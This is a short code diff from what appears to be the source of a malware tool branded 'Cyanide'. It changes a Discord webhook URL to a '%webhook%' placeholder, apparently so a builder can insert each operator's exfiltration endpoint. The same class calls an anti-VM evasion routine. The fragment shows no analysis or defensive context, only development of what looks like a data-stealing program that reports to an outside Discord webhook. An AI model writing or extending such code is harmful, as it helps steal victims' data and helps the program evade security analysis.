@@ -13,7 +13,7 @@ from discord_webhook import DiscordEmbed, DiscordWebhook
 
 class Main:
     def __init__(self) -> None:
-        self.webhook = DiscordWebhook(url='', username="Cyanide", avatar_url="https://cdn.discordapp.com/attachments/1063218191259676702/1084916459647549540/Cyanide.png")
+        self.webhook = DiscordWebhook(url='%webhook%', username="Cyanide", avatar_url="https://cdn.discordapp.com/attachments/1063218191259676702/1084916459647549540/Cyanide.png")
 
     def antivm(self):
         antivm.Antivm.run()
